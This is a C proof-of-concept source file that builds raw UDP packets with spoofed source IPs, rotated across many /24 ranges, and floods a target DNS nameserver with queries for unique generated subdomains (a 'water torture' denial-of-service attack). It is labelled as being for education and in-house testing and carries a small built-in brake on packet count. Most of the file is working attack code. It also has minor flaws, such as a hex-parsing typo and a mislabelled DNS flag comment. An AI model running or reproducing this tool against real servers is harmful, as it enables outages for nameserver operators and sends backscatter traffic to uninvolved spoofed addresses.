/**
 * Description: udp_authdns_stress -- PoC demonstrating (UDP) IP
 *   spoofing combined with DNS water torture attack
 * Copyright: Walter Doekes, 2023
 * License: BSD Zero Clause License
 * License-Text: Permission to use, copy, modify, and/or distribute this
 *   software for any purpose with or without fee is hereby granted.
 *
 * The DNS water torture attack congests (authoritative) nameservers by
 * requesting unique/generated subdomains, so they are not in cache.
 * This PoC uses IP spoofing to target a nameserver directly, without
 * going through DNS recursors.
 *
 * Use for educational purposes and in-house testing only. Using this
 * not only congests individual nameservers, it also creates DNS
 * response backscatter landing at the spoofed IPs on the internet.
 * Configure an outbound firewall on the victim server beforehand to
 * avoid this. (Response port 1025 for unchanged code.)
 */
#include <assert.h>
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_ether.h>   /* ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD */
#include <linux/if_packet.h>  /* struct sockaddr_ll (see man 7 packet) */
#include <net/if.h>           /* if_nametoindex */
#include <netinet/in.h>       /* IPPROTO_RAW, IPPROTO_UDP, INET_ADDRSTRLEN */
#include <netinet/ip.h>       /* struct ip and IP_MAXPACKET (65535) */
#include <netinet/udp.h>      /* struct udphdr */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

struct dnshdr {
    uint16_t id;    /* ID */

    /* 1 octet */
    uint8_t qr:1;   /* QR (1 = query) */
    uint8_t op:4;   /* OPCODE (0 = do_query) */
    uint8_t aa:1;   /* AA (0 = not auth answer (for answers)) */
    uint8_t tc:1;   /* TC (0 = not truncated) */
    uint8_t rd:1;   /* RD (0 = no recursion requested) */
    /* 1 octet */
    uint8_t ra:1;   /* RA (0 = no recursion available) */
    uint8_t z:3;    /* Z (reserved) */
    uint8_t rc:4;   /* RCODE (0 = no error (for answers)) */

    uint16_t qdcount;   /* QDCOUNT, question count (1) */
    uint16_t ancount;   /* ANCOUNT, answer count (0) */
    uint16_t nscount;   /* NSCOUNT, nameservers in answer count (0) */
    uint16_t arcount;   /* ARCOUNT, additional record count (0) */
};

#define IP_MAXSIZE 1500 /* more than enough, do not need IP_MAXPACKET */

typedef struct ip_udp_payload_t {
    struct ip ip_hdr;
    struct udphdr udp_hdr;
    char payload[0];
} ip_udp_payload_t;

typedef struct ip_udp_dns_payload_t {
    ip_udp_payload_t ip_udp_payload;
    struct dnshdr dns_hdr;
    char dns_payload[0];
} ip_udp_dns_payload_t;

typedef struct ip_packet_t {
    uint16_t packet_len;
    uint16_t packet_max;
    union {
        uint8_t octets[IP_MAXSIZE];
        ip_udp_payload_t ip_udp_payload;
        ip_udp_dns_payload_t ip_udp_dns_payload;
    };
} ip_packet_t;

/* Main loop that sends all the packets */
void alter_and_send(
    int sock, struct sockaddr_ll *dev, ip_packet_t *ip_packet,
    unsigned unique, unsigned limit);

/* Simple printf to create "unique" hostnames to query; use %0NNu as */
/* placeholder */
int qname_printf(ip_packet_t *ip_packet, const char *qname, unsigned number);

/* Set checksum on the raw UDP/IP packets */
void finalize_packet(ip_packet_t *ip_packet);

uint16_t ip_checksum_finish(uint32_t start, const uint16_t *addr, int len);
uint16_t ip_checksum(const uint16_t *addr, int len) {
    return ip_checksum_finish(0, addr, len);
}

uint16_t udp4_checksum(const ip_udp_payload_t *ip_udp_payload);
void mac_to_sll_addr(const char *mac, unsigned char *sll_addr6);

int parse_args(
        int argc, char *const *argv, const char **ifname, unsigned char *mac,
        struct in_addr *ip, unsigned *count);

int main(int argc, char *const *argv) {
    const char *target_ifname; /* eth0 */
    unsigned char target_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    struct in_addr target_ip; /* the-victim-dns-server */
    unsigned target_count; /* use 19123456 (19M to get all 16.7M /24s) */

    int raw_socket;
    ip_packet_t ip_packet = {0};

    /* check offsets and that struct packing has not messed with us */
    assert((void *)&ip_packet.octets ==
            (void *)&ip_packet.ip_udp_payload.ip_hdr);
    assert((void *)&ip_packet.ip_udp_payload.udp_hdr ==
            (void *)&ip_packet.ip_udp_dns_payload.ip_udp_payload.udp_hdr);
    assert((void *)&ip_packet.ip_udp_payload.payload ==
            (void *)&ip_packet.ip_udp_dns_payload.dns_hdr);

    /* parse / check arguments */
    if (!parse_args(
            argc, argv, &target_ifname, &target_mac[0], &target_ip,
            &target_count)) {
        return 1;
    }

    /* initialize random */
    srand(time(NULL) + getpid());

    /* make socket */
    raw_socket = socket(AF_PACKET, SOCK_DGRAM, 0 /* relevant for recv */);
    if (raw_socket < 0) {
        perror("socket(RAW)");
        return 1;
    }

    /* make destination config (the nearest gateway) */
    struct sockaddr_ll device = {0};
    device.sll_family = AF_PACKET;
    device.sll_protocol = htons(ETH_P_IP);  /* or (ETHERTYPE_IP), IP frame */
    device.sll_ifindex = if_nametoindex(target_ifname);
    memcpy(device.sll_addr, target_mac, 6); /* gateway MAC */
    device.sll_halen = 6;

    /* populate ip_packet with initial (spoofed) info */
    ip_packet.packet_len = 0;
    ip_packet.packet_max = IP_MAXSIZE;
    {
        struct ip *ip_hdr = &ip_packet.ip_udp_payload.ip_hdr;
        ip_hdr->ip_hl = 5;  /* header length 5 * sizeof(uint32) */
        ip_hdr->ip_v = 4;   /* ip version 4 */
        ip_hdr->ip_tos = 0; /* type of service */
        ip_hdr->ip_id = rand();
        ip_hdr->ip_ttl = 64; /* time to live */
        ip_hdr->ip_p = IPPROTO_UDP;
        memcpy(&ip_hdr->ip_src, "\x01\x02\x03\x04", 4);
        memcpy(&ip_hdr->ip_dst, &target_ip, sizeof(target_ip));
        ip_packet.packet_len += sizeof(*ip_hdr);
    }
    {
        struct udphdr *udp_hdr = &ip_packet.ip_udp_payload.udp_hdr;
        udp_hdr->source = htons(1025); /* block this in OUTPUT on victim */
        udp_hdr->dest = htons(53);
        ip_packet.packet_len += sizeof(*udp_hdr);
    }
    {
        struct dnshdr *dns_hdr = &ip_packet.ip_udp_dns_payload.dns_hdr;
        dns_hdr->id = rand();
        dns_hdr->qr = 1;
        dns_hdr->qdcount = htons(1);
        ip_packet.packet_len += sizeof(*dns_hdr);
    }
    {
        int ret = qname_printf(
            &ip_packet, "\x07" "example" "\x03" "com" "\x00", 0);
        ip_packet.packet_len += ret;
    }
    finalize_packet(&ip_packet);

    /* do a run */
    alter_and_send(raw_socket, &device, &ip_packet, 0, target_count);
    close(raw_socket);
    return 0;
}

int parse_args(
        int argc, char *const *argv, const char **ifname, unsigned char *mac,
        struct in_addr *ip, unsigned *count) {
    if (argc != 5) {
        fprintf(
            stderr, "Usage: %s ifname gateway_mac victim_ip count\n",
            argv[0]);
        return 0;
    }
    *ifname = argv[1];
    mac_to_sll_addr(argv[2], mac);
    if (inet_pton(AF_INET, argv[3], ip) != 1) {
        perror("inet_pton");
        return 0;
    }
    *count = atoi(argv[4]);
    return 1;
}

void finalize_packet(ip_packet_t *ip_packet) {
    struct ip *ip_hdr = &ip_packet->ip_udp_payload.ip_hdr;
    struct udphdr *udp_hdr = &ip_packet->ip_udp_payload.udp_hdr;
    {
        /* set packet length */
        ip_hdr->ip_len = htons(ip_packet->packet_len);
        udp_hdr->len = htons(
            ip_packet->packet_len - (ip_hdr->ip_hl << 2));
    }
    {
        /* this is mandatory */
        ip_hdr->ip_sum = 0; /* blank while calculating */
        ip_hdr->ip_sum = ip_checksum(
            (const uint16_t *)ip_hdr, sizeof(*ip_hdr));
    }
    {
        /* this is optional, udp checksum is allowed to be zero */
        /* set extra NUL which aids the udp4_checksum padding */
        assert(ip_packet->packet_len < ip_packet->packet_max);
        ip_packet->octets[ip_packet->packet_len] = '\0';
        udp_hdr->check = 0; /* blank while calculating */
        udp_hdr->check = udp4_checksum(&ip_packet->ip_udp_payload);
    }
}

int qname_printf(ip_packet_t *ip_packet, const char *qname, unsigned number) {
    char *buf = ip_packet->ip_udp_dns_payload.dns_payload;
    const char *end = (const char *)ip_packet->octets + ip_packet->packet_max;
    const int max = (end - buf) - 6;
    int ret;

    ret = snprintf(buf, max, qname, number);
    if (ret >= max || ret < 0) {
        errno = ENOMEM;
        return -1;
    }
    buf[ret++] = '\0';
    /* QTYPE_A */
    buf[ret++] = 0;
    buf[ret++] = 1;
    /* QCLASS_IN */
    buf[ret++] = 0;
    buf[ret++] = 1;
    /* udp4_checksum code wants a sixth byte here */

    return ret;
}

void alter_and_send(
        int sock, struct sockaddr_ll *dev, ip_packet_t *ip_packet,
        unsigned unique, unsigned limit) {
    ssize_t ret;
    unsigned char octet1, octet2, octet3;
    /* Using ".0" instead of ".2" or something so unintentional DNS */
    /* response backscatter reaches fewer real devices. */
    const unsigned char octet4 = 0;
    const int all_except_dns_payload = (
        ip_packet->ip_udp_dns_payload.dns_payload -
        (const char *)ip_packet->octets);
    struct in_addr *src = &ip_packet->ip_udp_payload.ip_hdr.ip_src;

    if (limit > 10) {
        /* Are you sure? */
        return;
    }

    while (limit) {
        /* Looping over X.Y.Z.0 so the victim gets traffic from various /24s, */
        /* making simple firewall hashlimits ineffective. */
        for (octet1 = 1; octet1 < 255; ++octet1) {
            /* Use a very coarse filter to skip RFC1918 and multicast IPs */
            if (octet1 == 10 || octet1 == 127 || octet1 == 169 ||
                    octet1 == 172 || octet1 == 192 || octet1 >= 224) {
                continue;
            }
            for (octet2 = 1; octet2 < 255; ++octet2) {
                for (octet3 = 1; octet3 < 255; ++octet3) {
                    if (!limit--) {
                        return;
                    }
                    /* alter IDs */
                    ip_packet->ip_udp_payload.ip_hdr.ip_id = rand();
                    ip_packet->ip_udp_dns_payload.dns_hdr.id = rand();
                    /* alter source IP */
                    ((unsigned char *)src)[0] = octet1;
                    ((unsigned char *)src)[1] = octet2;
                    ((unsigned char *)src)[2] = octet3;
                    ((unsigned char *)src)[3] = octet4;
                    /* alter QNAME: DNS names consist of [size][name*] */
                    /* up to the root, where the root-name has size 0. */
                    /* For example: [3]www[7]example[3]com[0] */
                    /* qname_printf() also adds the type and the qclass */
                    ret = qname_printf(ip_packet, (
                        "\x0bt%010u"
                        "\x07" "example" "\x03" "com"), unique++);
                    if (ret < 0) {
                        perror("qname_printf");
                        return;
                    }
                    /* finalize */
                    ip_packet->packet_len = all_except_dns_payload + ret;
                    finalize_packet(ip_packet);

                    /* send one */
                    ret = sendto(
                        sock, &ip_packet->octets, ip_packet->packet_len, 0,
                        (const struct sockaddr *)dev, sizeof(*dev));
                    if (ret <= 0) {
                        perror("sendto");
                        return;
                    }
                }
                printf(
                    "%hhu.%hhu.*.%hhu (%u left)\n", octet1, octet2,
                    octet4, limit);
                usleep(1);
            }
        }
    }
}

/* Computing the internet checksum (RFC 1071). */
/* "[The] internet checksum is not guaranteed to preclude collisions." */
/* "The sum of 16-bit integers can be computed in either byte order." */
uint16_t ip_checksum_finish(uint32_t start, const uint16_t *addr, int len) {
    register uint32_t sum = start;
    uint16_t answer = 0;

    /* Sum up 2-byte values until none or only one byte left. */
    while (len > 1) {
        sum += *(addr++);
        len -= 2;
    }

    /* Add left-over byte, if any. */
    if (len > 0) {
        sum += *(uint8_t *)addr;
    }

    /* Fold 32-bit sum into 16 bits; we lose information by doing this, */
    /* increasing the chances of a collision. */
    /* sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits) */
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    /* Checksum is one's complement of sum. */
    answer = ~sum;

    /* This has the right endianness for network. No need for htons here. */
    return answer;
}

/* Build IPv4 UDP pseudo-header and call checksum function. */
uint16_t udp4_checksum(const ip_udp_payload_t *ip_udp_payload) {
    const struct ip *ip_hdr = &ip_udp_payload->ip_hdr;
    int udp_and_payload_len = (
        ntohs(ip_hdr->ip_len) - (ip_hdr->ip_hl << 2));
    uint32_t sum = 0;
    const uint8_t *dword;

    /* the caller guarantees that we have an extra 0 at our disposal at */
    /* the end of data */
    if (udp_and_payload_len % 2 == 1) {
        ++udp_and_payload_len;
    }

    /* pseudoheader */
#if __BYTE_ORDER == __LITTLE_ENDIAN
# define HI(x) (x+1)
# define LO(x) (x)
#else
# define HI(x) (x)
# define LO(x) (x+1)
#endif
    /* avoid using (uint16_t*) cast, it raises strict aliasing warnings */
    dword = (const uint8_t *)&ip_hdr->ip_src;
    sum += (dword[HI(0)] << 8 | dword[LO(0)]);
    sum += (dword[HI(2)] << 8 | dword[LO(2)]);
    dword = (const uint8_t *)&ip_hdr->ip_dst;
    sum += (dword[HI(0)] << 8 | dword[LO(0)]);
    sum += (dword[HI(2)] << 8 | dword[LO(2)]);
#undef HI
#undef LO
    sum += htons((uint16_t)ip_hdr->ip_p); /* 0000 0000 PROT OCOL */
    sum += ((const uint16_t *)&ip_udp_payload->udp_hdr.len)[0];
    /* checksum rest of udp header and payload */
    return ip_checksum_finish(
        sum, (const uint16_t *)&ip_udp_payload->udp_hdr, udp_and_payload_len);
}

/* Input "00:11:22:33:44:55", output {0x00, 0x11, 0x22, ...} */
/* Any separator is accepted "00-11-22.." or "001122.." or even */
/* "0, 11, 22, .." */
void mac_to_sll_addr(const char *mac, unsigned char *sll_addr6) {
    unsigned char *bufp = sll_addr6;
    unsigned char *endp = bufp + 6;
    int state = 0; /* first_nibble, low_nibble */
    memset(sll_addr6, 0, 6);
    do {
        unsigned char num;
        if (*mac >= '0' && *mac <= '9') {
            num = (*mac - '0');
        } else if (*mac >= 'A' && *mac <= 'A') {
            num = (*mac - 'A') + 10;
        } else if (*mac >= 'a' && *mac <= 'f') {
            num = (*mac - 'a') + 10;
        } else {
            /* no_nibble (if we set something, go to next position) */
            if (state) {
                ++bufp;
            }
            state = 0;
            continue;
        }
        *bufp = (*bufp << 4 | num);
        if (state) {
            /* low_nibble, go to next position */
            ++bufp;
            state = 0;
        } else {
            /* first_nibble, maybe there is a low one too */
            state = 1;
        }
    } while (*++mac != '\0' && bufp < endp);
}

/* vim: set ts=8 sw=4 sts=4 et ai: */
